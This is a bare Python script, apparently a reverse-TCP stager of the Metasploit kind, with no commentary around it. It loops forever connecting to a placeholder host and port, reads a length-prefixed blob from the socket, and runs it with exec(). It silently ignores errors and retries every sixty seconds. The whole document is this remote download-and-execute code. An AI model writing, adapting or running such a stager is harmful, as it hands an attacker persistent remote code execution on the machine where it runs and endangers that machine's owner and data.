import socket,struct
import time

while True:
    try:
        s=socket.socket(2,1)
        s.connect(('host',l_port))
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(4096)
        while len(d)!=l:
            d+=s.recv(4096)
        exec(d,{'s':s})
    except:
        pass
    time.sleep(60)


